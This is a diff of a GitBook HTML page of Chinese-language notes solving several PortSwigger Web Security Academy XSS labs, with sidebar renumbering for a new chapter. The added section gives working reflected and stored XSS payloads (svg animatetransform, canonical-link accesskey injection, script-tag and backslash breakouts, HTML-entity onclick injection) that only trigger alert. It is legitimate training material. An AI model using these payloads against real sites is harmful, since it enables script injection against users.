@@ -60,7 +60,7 @@
     <link rel="next" href="WMCTF 2023 web writeup.html" />
     
     
-    <link rel="prev" href="羊城杯 2023 web writeup.html" />
+    <link rel="prev" href="Learn from HitCon CTF2023.md" />
     
 
     </head>
@@ -116,7 +116,20 @@
             
         </li>
     
-        <li class="chapter " data-level="1.3" data-path="webacademy XSS.html">
+        <li class="chapter " data-level="1.3" data-path="Learn from HitCon CTF2023.md">
+            
+                <span>
+            
+                    
+                    Learn from HitCon CTF2023
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.4" data-path="webacademy XSS.html">
             
                 <a href="webacademy XSS.html#20230829">
             
@@ -129,7 +142,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.4" data-path="WMCTF 2023 web writeup.html">
+        <li class="chapter " data-level="1.5" data-path="WMCTF 2023 web writeup.html">
             
                 <a href="WMCTF 2023 web writeup.html#20230824">
             
@@ -142,7 +155,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.5" data-path="Racing and Smashing the state machine.html">
+        <li class="chapter " data-level="1.6" data-path="Racing and Smashing the state machine.html">
             
                 <a href="Racing and Smashing the state machine.html#20230817">
             
@@ -155,7 +168,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.6" data-path="ioredis源码阅读.html">
+        <li class="chapter " data-level="1.7" data-path="ioredis源码阅读.html">
             
                 <a href="ioredis源码阅读.html#20230718">
             
@@ -168,7 +181,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.7" data-path="Gandalf AI challenge.html">
+        <li class="chapter " data-level="1.8" data-path="Gandalf AI challenge.html">
             
                 <a href="Gandalf AI challenge.html#20230707">
             
@@ -181,7 +194,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.8" data-path="NSSCTF challenges.html">
+        <li class="chapter " data-level="1.9" data-path="NSSCTF challenges.html">
             
                 <a href="NSSCTF challenges.html#20230605">
             
@@ -194,7 +207,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.9" data-path="JS 的一些特性：原型链，作用域，闭包.html">
+        <li class="chapter " data-level="1.10" data-path="JS 的一些特性：原型链，作用域，闭包.html">
             
                 <a href="JS 的一些特性：原型链，作用域，闭包.html#20230117">
             
@@ -207,7 +220,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.10" data-path="CBCTF-0RAYS协会招新.html">
+        <li class="chapter " data-level="1.11" data-path="CBCTF-0RAYS协会招新.html">
             
                 <a href="CBCTF-0RAYS协会招新.html#20221212">
             
@@ -220,7 +233,7 @@
             
         </li>
     
-        <li class="chapter " data-level="1.11" data-path="utils&memo.html">
+        <li class="chapter " data-level="1.12" data-path="utils&memo.html">
             
                 <a href="utils&memo.html#20230423">
             
@@ -511,8 +524,39 @@
 <p><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank">XSS Cheet Sheet</a> &#x6709;&#x4E2A;&#x529F;&#x80FD;&#x662F; Copy tags/event/payloads&#xFF0C;&#x548C;<code>Burp Suite</code>&#x7684; Intruder &#x529F;&#x80FD;&#x683C;&#x5F0F;&#x4E5F;&#x5BF9;&#x63A5;&#x597D;&#x4E86;&#x3002;&#x53EF;&#x4EE5;&#x76F4;&#x63A5; Copy-Paste &#x5230; payloads &#x91CC;</p>
 <p>&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;&#x53EA;&#x6709;<code>&lt;svg&gt;</code>&#x3001;<code>&lt;animatetransform&gt;</code>&#x3001;<code>&lt;title&gt;</code>&#x548C; <code>&lt;image&gt;</code>&#x662F; valid tag&#x3002;&#x7136;&#x540E;&#x6D4B;&#x8BD5;<code>&lt;svg&gt;</code>&#x7684;&#x5C5E;&#x6027;/&#x4E8B;&#x4EF6;&#xFF0C;&#x53D1;&#x73B0;&#x5168;&#x90E8;invalid&#x3002;<code>&lt;svg&gt;</code>&#x8FD8;&#x6709;&#x540E;&#x9762;&#x8FDE;&#x63A5;<code>animatetransform</code>&#x3001;<code>animatemotion</code>&#x3001;<code>animate</code>&#x7684;&#x7528;&#x6CD5;&#xFF0C;&#x6D4B;&#x8BD5;&#x53D1;&#x73B0;<code>animatetransform</code>&#x53EF;&#x4EE5;&#x4F7F;&#x7528;</p>
 <p>&#x7136;&#x540E;&#x518D;&#x5BF9;<code>animatetransform</code>&#x7684;&#x4E8B;&#x4EF6;/&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x6D4B;&#x8BD5;&#xFF0C;</p>
-<pre><code>/?search=&quot;&gt;&lt;svg&gt;&lt;animatetransform onbegin=alert(1)&gt;
+<pre><code class="lang-html">/?search=&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
 </code></pre>
+<h2 id="lab-reflected-xss-in-canonical-link-tag">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> in canonical link tag</h2>
+<p>&#x540E;&#x7AEF;&#x754C;&#x9762;&#x6E32;&#x67D3;&#x3002;&#x4F1A;&#x628A;<code>&lt;link rel=&quot;canonical&quot; href=&quot;https://0a6e00520312cce98c1ab92f007d0027.web-security-academy.net/?[input]&quot;&gt;</code>&#x6E32;&#x67D3;&#x5230;canonical head&#x91CC;&#x9762;&#x3002;</p>
+<p><a href="https://www.1deng.me/canonical-url.html#shen_me_shi_canonical_URL_biao_qian" target="_blank">canonical</a>&#x6807;&#x7B7E; &#x88AB;&#x79F0;&#x4F5C;&#x89C4;&#x8303;&#x7F51;&#x5740;&#xFF0C;&#x662F;&#x7528;&#x6765;&#x7ED9;&#x722C;&#x866B;&#x673A;&#x5668;&#x4EBA;&#x770B;&#x7684;&#xFF08;&#x914D;&#x7F6E;&#x53EF;&#x4EE5;&#x63D0;&#x9AD8;SEO&#xFF09;</p>
+<p>&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6CE8;&#x5165;&#x5C5E;&#x6027;&#x3002;&#x9898;&#x89E3;&#x7ED9;&#x51FA;&#x7684;&#x5C5E;&#x6027;&#x662F;<code>accesskey</code>&#xFF0C;&#x7531;&#x952E;&#x76D8;&#x89E6;&#x53D1;&#x3002;&#x53E6;&#x5916;&#x6CE8;&#x5165;&#x7684;&#x5176;&#x4ED6;&#x5C5E;&#x6027;&#x4F3C;&#x4E4E;&#x5728;canonical&#x4E0B;&#x4E0D;&#x751F;&#x6548;&#x3002;</p>
+<p><img src="webacademy XSS/image-20230912144444581.png" alt="image-20230912144444581"></p>
+<pre><code class="lang-html">/?&apos;accesskey=&apos;x&apos;onclick=&apos;alert(document.domain)
+</code></pre>
+<h2 id="lab-reflected-xss-into-a-javascript-string-with-single-quote-and-backslash-escaped">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into a JavaScript string with single quote and backslash escaped</h2>
+<pre><code class="lang-js"><span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&apos;{{inupt}}&apos;</span>;
+<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&apos;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&apos;&quot;&gt;&apos;</span>);
+</code></pre>
+<p>&#x9519;&#x8BEF;&#x7684;&#x8F6C;&#x4E49;&#x7B56;&#x7565;&#xFF1A;&#x6CA1;&#x6709;&#x8F6C;&#x4E49;&#x659C;&#x6760;&#x548C;&#x5C16;&#x62EC;&#x53F7;&#x3002;</p>
+<p>&#x76F4;&#x63A5;&#x6CE8;&#x5165;<code>&lt;script&gt;</code>&#x6807;&#x7B7E;&#x3002;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">alert(<span class="hljs-built_in">document</span>.domain)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<h2 id="lab-reflected-xss-into-a-javascript-string-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-escaped">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank">Reflected XSS</a> into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped</h2>
+<p>&#x524D;&#x7AEF;&#x6E32;&#x67D3;</p>
+<pre><code class="lang-js"><span class="hljs-keyword">var</span> searchTerms = <span class="hljs-string">&apos;{{input}}&apos;</span>;
+<span class="hljs-built_in">document</span>.write(<span class="hljs-string">&apos;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&apos;</span>+<span class="hljs-built_in">encodeURIComponent</span>(searchTerms)+<span class="hljs-string">&apos;&quot;&gt;&apos;</span>);
+</code></pre>
+<p>&#x53CD;&#x659C;&#x6760;&#x6CA1;&#x6709;&#x88AB;&#x6B63;&#x786E;&#x8F6C;&#x4E49;</p>
+<pre><code class="lang-js">\&apos;-alert(document.domain)//
+</code></pre>
+<h2 id="lab-stored-xss-into-onclick-event-with-angle-brackets-and-double-quotes-html-encoded-and-single-quotes-and-backslash-escaped">Lab: <a href="https://portswigger.net/web-security/cross-site-scripting/stored" target="_blank">Stored XSS</a> into <code>onclick</code> event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped</h2>
+<p>&#x5B58;&#x50A8;&#x578B;&#x3002;&#x540E;&#x7AEF;&#x6E32;&#x67D3;</p>
+<pre><code class="lang-html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;author&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://ww.adsd&quot;</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;var tracker={track(){}};tracker.track(&apos;{{website}}&apos;);&quot;</span>&gt;</span>1234<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+</code></pre>
+<p>&#x5355;&#x53CC;&#x5F15;&#x53F7;&#x3001;&#x53CD;&#x659C;&#x6760;&#x5747;&#x8FC7;&#x6EE4;&#x3002;&#x800C;onclick&#x4E8B;&#x4EF6;&#x5728;&#x89E6;&#x53D1;&#x65F6;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x6B21;html&#x5B9E;&#x4F53;&#x89E3;&#x7801;</p>
+<pre><code class="lang-html">http://foo?&amp;apos;-alert(document.domain)-&amp;apos;
+</code></pre>
+
                                 
                                 </section>
                             
@@ -539,7 +583,7 @@
 
             
                 
-                <!-- <a href="羊城杯 2023 web writeup.html#20230903" class="navigation navigation-prev " aria-label="Previous page: 羊城杯 2023 web writeup">
+                <!-- <a href="Learn from HitCon CTF2023.md#20230911" class="navigation navigation-prev " aria-label="Previous page: Learn from HitCon CTF2023">
                     <i class="fa fa-angle-left"></i>
                 </a> -->
                 
@@ -555,7 +599,7 @@
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"webacademy XSS","level":"1.3","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.4","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"羊城杯 2023 web writeup","level":"1.2","depth":1,"anchor":"#20230903","path":"羊城杯 2023 web writeup.md","ref":"羊城杯 2023 web writeup.md#20230903","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"webacademy XSS.md","mtime":"2023-09-06T16:04:48.143Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-06T16:05:06.375Z"},"basePath":".","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"webacademy XSS","level":"1.4","depth":1,"next":{"title":"WMCTF2023 web writeup","level":"1.5","depth":1,"anchor":"#20230824","path":"WMCTF 2023 web writeup.md","ref":"WMCTF 2023 web writeup.md#20230824","articles":[]},"previous":{"title":"Learn from HitCon CTF2023","level":"1.3","depth":1,"anchor":"#20230911","path":"Learn from HitCon CTF2023.md","ref":"Learn from HitCon CTF2023.md#20230911","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr"],"root":"./pages","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"fontsettings":{"theme":"night","family":"serif","size":2},"highlight":{},"search":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"gitbook":"*"},"file":{"path":"webacademy XSS.md","mtime":"2023-09-13T14:56:03.507Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2023-09-13T14:59:19.720Z"},"basePath":".","book":{"language":""}});
         });
     </script>
 </div>
